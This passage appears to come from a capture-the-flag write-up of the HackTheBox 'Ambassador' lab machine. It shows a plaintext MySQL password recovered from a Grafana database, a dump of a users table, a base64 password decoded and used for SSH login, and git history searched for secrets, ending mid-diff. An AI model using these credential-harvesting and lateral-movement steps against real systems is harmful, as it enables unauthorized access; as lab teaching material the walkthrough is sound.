</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=k>access</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>url</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>password</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=k>user</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=k>database</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>basic_auth</span><span class=o>`</span><span class=w> </span><span class=nb>INTEGER</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>basic_auth_user</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>basic_auth_password</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>is_default</span><span class=o>`</span><span class=w> </span><span class=nb>INTEGER</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>json_data</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>created</span><span class=o>`</span><span class=w> </span><span class=n>DATETIME</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>updated</span><span class=o>`</span><span class=w> </span><span class=n>DATETIME</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>with_credentials</span><span class=o>`</span><span class=w> </span><span class=nb>INTEGER</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w> </span><span class=k>DEFAULT</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>secure_json_data</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>read_only</span><span class=o>`</span><span class=w> </span><span class=nb>INTEGER</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>uid</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w> </span><span class=k>DEFAULT</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>data_source</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;mysql&#39;</span><span class=p>,</span><span class=s1>&#39;mysql.yaml&#39;</span><span class=p>,</span><span class=s1>&#39;proxy&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;dontStandSoCloseToMe63221!&#39;</span><span class=p>,</span><span class=s1>&#39;grafana&#39;</span><span class=p>,</span><span class=s1>&#39;grafana&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>X</span><span class=s1>&#39;7b7d&#39;</span><span class=p>,</span><span class=s1>&#39;2022-09-01 22:43:03&#39;</span><span class=p>,</span><span class=s1>&#39;2022-10-24 14:24:03&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;{}&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;uKewFgM4z&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>COMMIT</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>After studying the database we find the password for MySQL, located on port 3306. Let&rsquo;s connect:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>&gt;</span><span class=w> </span><span class=n>mysql</span><span class=w> </span><span class=c1>--host amba.htb -u grafana -p
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Enter</span><span class=w> </span><span class=n>password</span><span class=p>:</span><span class=w> </span><span class=n>dontStandSoCloseToMe63221</span><span class=o>!</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Welcome</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>MariaDB</span><span class=w> </span><span class=n>monitor</span><span class=p>.</span><span class=w> </span><span class=n>Commands</span><span class=w> </span><span class=k>end</span><span class=w> </span><span class=k>with</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=err>\</span><span class=k>g</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Your</span><span class=w> </span><span class=n>MySQL</span><span class=w> </span><span class=k>connection</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=mi>62</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Server</span><span class=w> </span><span class=k>version</span><span class=p>:</span><span class=w> </span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>30</span><span class=o>-</span><span class=mi>0</span><span class=n>ubuntu0</span><span class=p>.</span><span class=mi>20</span><span class=p>.</span><span class=mi>04</span><span class=p>.</span><span class=mi>2</span><span class=w> </span><span class=p>(</span><span class=n>Ubuntu</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Copyright</span><span class=w> </span><span class=p>(</span><span class=k>c</span><span class=p>)</span><span class=w> </span><span class=mi>2000</span><span class=p>,</span><span class=w> </span><span class=mi>2018</span><span class=p>,</span><span class=w> </span><span class=n>Oracle</span><span class=p>,</span><span class=w> </span><span class=n>MariaDB</span><span class=w> </span><span class=n>Corporation</span><span class=w> </span><span class=n>Ab</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>others</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Type</span><span class=w> </span><span class=s1>&#39;help;&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=s1>&#39;\h&#39;</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>help</span><span class=p>.</span><span class=w> </span><span class=k>Type</span><span class=w> </span><span class=s1>&#39;\c&#39;</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>clear</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>current</span><span class=w> </span><span class=k>input</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MySQL</span><span class=w> </span><span class=p>[(</span><span class=k>none</span><span class=p>)]</span><span class=o>&gt;</span><span class=w> </span><span class=k>SHOW</span><span class=w> </span><span class=n>DATABASES</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>Database</span><span class=w>           </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>grafana</span><span class=w>            </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>information_schema</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>mysql</span><span class=w>              </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>performance_schema</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>sys</span><span class=w>                </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>whackywidget</span><span class=w>       </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>6</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>137</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MySQL</span><span class=w> </span><span class=p>[(</span><span class=k>none</span><span class=p>)]</span><span class=o>&gt;</span><span class=w> </span><span class=n>use</span><span class=w> </span><span class=n>whackywidget</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Reading</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=n>information</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>completion</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=k>names</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>You</span><span class=w> </span><span class=n>can</span><span class=w> </span><span class=n>turn</span><span class=w> </span><span class=k>off</span><span class=w> </span><span class=n>this</span><span class=w> </span><span class=n>feature</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=k>get</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>quicker</span><span class=w> </span><span class=n>startup</span><span class=w> </span><span class=k>with</span><span class=w> </span><span class=o>-</span><span class=n>A</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Database</span><span class=w> </span><span class=n>changed</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MySQL</span><span class=w> </span><span class=p>[</span><span class=n>whackywidget</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>show</span><span class=w> </span><span class=n>tables</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>Tables_in_whackywidget</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>users</span><span class=w>                  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>132</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MySQL</span><span class=w> </span><span class=p>[</span><span class=n>whackywidget</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------+------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>user</span><span class=w>     </span><span class=o>|</span><span class=w> </span><span class=n>pass</span><span class=w>                                      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------+------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>developer</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg</span><span class=o>==</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------+------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>134</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>We get base64 encoded password.Decode it, connect via SSH and take the user.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>&gt; <span class=nb>echo</span> <span class=nv>YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg</span><span class=o>==</span> <span class=p>|</span> base64 -d 
</span></span><span class=line><span class=cl>anEnglishManInNewYork027468
</span></span><span class=line><span class=cl>&gt; ssh developer@amba.htb
</span></span><span class=line><span class=cl>developer@amba.htb<span class=err>&#39;</span>s password: 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.5 LTS <span class=o>(</span>GNU/Linux 5.4.0-126-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>Last login: Mon Oct <span class=m>24</span> 17:16:55 <span class=m>2022</span> from 10.10.16.43
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-5.0$ ls
</span></span><span class=line><span class=cl>snap user.txt
</span></span></code></pre></td></tr></table></div></div><h2 id=privelege-escalation>Privelege Escalation<a hidden class=anchor aria-hidden=true href=#privelege-escalation>#</a></h2><p>Using linpeas, find the git repository:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>╔══════════╣ Analyzing Github Files (limit 70)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-rw-rw-r-- 1 developer developer 93 Sep 2 02:28 /home/developer/.gitconfig
</span></span><span class=line><span class=cl>drwxrwxr-x 8 root root 4096 Mar 14 2022 /opt/my-app/.git
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>:</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>my</span><span class=o>-</span><span class=n>app</span><span class=o>/</span><span class=p>.</span><span class=n>git$</span><span class=w> </span><span class=n>git</span><span class=w> </span><span class=n>log</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>fatal</span><span class=p>:</span><span class=w> </span><span class=n>detected</span><span class=w> </span><span class=n>dubious</span><span class=w> </span><span class=n>ownership</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=n>repository</span><span class=w> </span><span class=k>at</span><span class=w> </span><span class=s1>&#39;/opt/my-app/.git&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>To</span><span class=w> </span><span class=k>add</span><span class=w> </span><span class=n>an</span><span class=w> </span><span class=k>exception</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>this</span><span class=w> </span><span class=n>directory</span><span class=p>,</span><span class=w> </span><span class=k>call</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=n>git</span><span class=w> </span><span class=n>config</span><span class=w> </span><span class=c1>--global --add safe.directory /opt/my-app/.git
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>:</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>my</span><span class=o>-</span><span class=n>app</span><span class=o>/</span><span class=p>.</span><span class=n>git$</span><span class=w> </span><span class=n>git</span><span class=w> </span><span class=n>config</span><span class=w> </span><span class=c1>--global --add safe.directory /opt/my-app/.git
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>:</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>my</span><span class=o>-</span><span class=n>app</span><span class=o>/</span><span class=p>.</span><span class=n>git$</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>:</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>my</span><span class=o>-</span><span class=n>app</span><span class=o>/</span><span class=p>.</span><span class=n>git$</span><span class=w> </span><span class=n>git</span><span class=w> </span><span class=n>log</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>commit</span><span class=w> </span><span class=mi>33</span><span class=n>a53ef9a207976d5ceceddc41a199558843bf3c</span><span class=w> </span><span class=p>(</span><span class=n>HEAD</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>main</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Author</span><span class=p>:</span><span class=w> </span><span class=n>Developer</span><span class=w> </span><span class=o>&lt;</span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>.</span><span class=k>local</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nb>Date</span><span class=p>:</span><span class=w>  </span><span class=n>Sun</span><span class=w> </span><span class=n>Mar</span><span class=w> </span><span class=mi>13</span><span class=w> </span><span class=mi>23</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>36</span><span class=w> </span><span class=mi>2022</span><span class=w> </span><span class=o>+</span><span class=mi>0000</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=n>tidy</span><span class=w> </span><span class=n>config</span><span class=w> </span><span class=n>script</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>commit</span><span class=w> </span><span class=n>c982db8eff6f10f8f3a7d802f79f2705e7a21b55</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Author</span><span class=p>:</span><span class=w> </span><span class=n>Developer</span><span class=w> </span><span class=o>&lt;</span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>.</span><span class=k>local</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nb>Date</span><span class=p>:</span><span class=w>  </span><span class=n>Sun</span><span class=w> </span><span class=n>Mar</span><span class=w> </span><span class=mi>13</span><span class=w> </span><span class=mi>23</span><span class=p>:</span><span class=mi>44</span><span class=p>:</span><span class=mi>45</span><span class=w> </span><span class=mi>2022</span><span class=w> </span><span class=o>+</span><span class=mi>0000</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=n>config</span><span class=w> </span><span class=n>script</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>commit</span><span class=w> </span><span class=mi>8</span><span class=n>dce6570187fd1dcfb127f51f147cd1ca8dc01c6</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Author</span><span class=p>:</span><span class=w> </span><span class=n>Developer</span><span class=w> </span><span class=o>&lt;</span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>.</span><span class=k>local</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nb>Date</span><span class=p>:</span><span class=w>  </span><span class=n>Sun</span><span class=w> </span><span class=n>Mar</span><span class=w> </span><span class=mi>13</span><span class=w> </span><span class=mi>22</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>01</span><span class=w> </span><span class=mi>2022</span><span class=w> </span><span class=o>+</span><span class=mi>0000</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=n>created</span><span class=w> </span><span class=n>project</span><span class=w> </span><span class=k>with</span><span class=w> </span><span class=n>django</span><span class=w> </span><span class=n>CLI</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>commit</span><span class=w> </span><span class=mi>4</span><span class=n>b8597b167b2fbf8ec35f992224e612bf28d9e51</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Author</span><span class=p>:</span><span class=w> </span><span class=n>Developer</span><span class=w> </span><span class=o>&lt;</span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>.</span><span class=k>local</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nb>Date</span><span class=p>:</span><span class=w>  </span><span class=n>Sun</span><span class=w> </span><span class=n>Mar</span><span class=w> </span><span class=mi>13</span><span class=w> </span><span class=mi>22</span><span class=p>:</span><span class=mi>44</span><span class=p>:</span><span class=mi>11</span><span class=w> </span><span class=mi>2022</span><span class=w> </span><span class=o>+</span><span class=mi>0000</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=p>.</span><span class=n>gitignore</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>:</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>my</span><span class=o>-</span><span class=n>app</span><span class=o>/</span><span class=p>.</span><span class=n>git$</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>:</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>my</span><span class=o>-</span><span class=n>app</span><span class=o>/</span><span class=p>.</span><span class=n>git$</span><span class=w> </span><span class=n>git</span><span class=w> </span><span class=k>show</span><span class=w> </span><span class=n>c982db8eff6f10f8f3a7d802f79f2705e7a21b55</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>commit</span><span class=w> </span><span class=n>c982db8eff6f10f8f3a7d802f79f2705e7a21b55</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Author</span><span class=p>:</span><span class=w> </span><span class=n>Developer</span><span class=w> </span><span class=o>&lt;</span><span class=n>developer</span><span class=o>@</span><span class=n>ambassador</span><span class=p>.</span><span class=k>local</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nb>Date</span><span class=p>:</span><span class=w>  </span><span class=n>Sun</span><span class=w> </span><span class=n>Mar</span><span class=w> </span><span class=mi>13</span><span class=w> </span><span class=mi>23</span><span class=p>:</span><span class=mi>44</span><span class=p>:</span><span class=mi>45</span><span class=w> </span><span class=mi>2022</span><span class=w> </span><span class=o>+</span><span class=mi>0000</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=n>config</span><span class=w> </span><span class=n>script</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>diff</span><span class=w> </span><span class=c1>--git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>new</span><span class=w> </span><span class=n>file</span><span class=w> </span><span class=k>mode</span><span class=w> </span><span class=mi>100755</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>index</span><span class=w> </span><span class=mi>0000000</span><span class=p>..</span><span class=mi>35</span><span class=n>c08f6</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--- /dev/null
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>+++</span><span class=w> </span><span class=n>b</span><span class=o>/</span><span class=n>whackywidget</span><span class=o>/</span><span class=n>put</span><span class=o>-</span><span class=n>config</span><span class=o>-</span><span class=k>in</span><span class=o>-</span><span class=n>consul</span><span class=p>.</span><span class=n>sh</span><span class=w>
